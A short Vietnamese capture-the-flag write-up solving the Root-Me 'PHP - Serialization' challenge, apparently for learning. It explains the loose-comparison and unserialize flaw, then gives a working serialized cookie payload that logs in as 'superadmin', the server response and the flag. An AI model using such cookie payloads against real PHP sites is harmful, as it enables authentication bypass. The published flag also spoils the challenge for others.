# [PHP - Serialization](https://www.root-me.org/en/Challenges/Web-Server/PHP-Serialization)

## Solutions

Lỗ hổng:

- Nhặt được tên tài khoản admin ở source code: `superadmin`
- true == "string" luôn luôn bằng true:
  - `$data['password'] == $auth[ $data['login'] ]`
- phía người dùng có thể tùy ý thay đổi cookie autologin để pass thẳng vào hàm unserialize => có thể tạo biến kiểu boolean

Khai thác:

- Serialize array("password"=>true, "login"=>"superadmin") được: `a:2:{s:8:"password";b:1;s:5:"login";s:10:"superadmin";}`
- urlencode và gửi trong cookie header: `autologin=a%3a2%3a%7bs%3a8%3a%22password%22%3bb%3a1%3bs%3a5%3a%22login%22%3bs%3a10%3a%22superadmin%22%3b%7d`

Kết quả:

```html
<p>Great ! Welcome superadmin !</p>
<p>You can validate the challenge with the password : NoUserInputInPHPSerialization!
</p>
```

Flag: `NoUserInputInPHPSerialization`
